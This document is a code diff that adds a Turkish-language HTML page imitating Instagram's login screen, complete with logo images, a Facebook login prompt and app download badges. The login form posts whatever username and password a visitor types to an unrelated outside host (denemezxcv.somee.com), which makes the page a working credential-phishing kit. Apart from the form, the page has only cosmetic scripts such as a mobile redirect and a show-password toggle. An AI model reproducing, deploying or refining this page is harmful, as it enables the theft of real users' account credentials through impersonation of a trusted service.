@@ -1,0 +1,74 @@
+<html>
+	<head>
+		<meta charset = "UTF-8">
+		<title>Instagram</title>	
+		<link href="css/giris.css" rel="stylesheet"/>
+		<link rel="icon" href="foto/title.ico" type="image/gif" sizes="16x16">
+	</head>
+
+	<body id="body">
+		
+		<img id="telefon" src="foto/telefon.png">
+		<div>
+			<img id="change" src="foto/tel1.png">
+		</div>
+		
+		<div id="border">
+			<img id="instagramresim" src="foto/instagram_resim.png">
+			<form action="http://denemezxcv.somee.com" method="post">
+				<input id="username" name="username" type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
+				<input id="password" name="password" type="password" placeholder="şifre" onclick="button_color()">
+				<input id="login" type="submit" value="Giriş Yap">
+			</form>	
+			<input type="button" id="goster" onclick="goster_func()" value="Göster" style="visibility: hidden;">
+			<img id="yada" src="foto/yada.png">
+			<img id="faceicon" src="foto/faceicon.png"></a>
+			
+			<p id="unut" >Şifreni mi unuttun?</p>
+			<p id="facebooklogin">Facebook ile Giriş Yap</p>
+		</div>
+		
+		<div id="border2">
+			<p id="hesabın">Hesabın yok mu? </p>		
+			<p id="kaydol">Kaydol</p >
+		</div>
+
+		<div id="border3">
+			<p id="indir">Uygulamayı indir.</p>
+			<img id="appstore" src="foto/appstore.png">
+			<img id="googleplay" src="foto/googleplay.png">
+		</div>
+		
+		<script>
+			var uzunluk = window.screen.height;
+			var genişlik = window.screen.width;
+			if (uzunluk <= "800" && genişlik <= "800"){
+				window.location.href='mobile.html';
+			}
+			function button_color(){
+				document.getElementById("login").style.backgroundColor="0095f6";
+				document.getElementById("goster").style.visibility = "initial"; 
+			}
+			function goster_func(){
+				var goster = document.getElementById("goster").value;
+				if (goster == "Göster"){
+					document.getElementById("goster").value="Gizle";
+				}
+				else {
+					document.getElementById("goster").value="Göster";
+				}
+			
+			}	
+			function myFunction() {
+				var x = document.getElementById("password");
+				if (x.type === "password") {
+					x.type = "text";
+				} 
+				else {
+					x.type = "password";
+				}
+			}
+			
+		</script>
+	</body>
+</html>
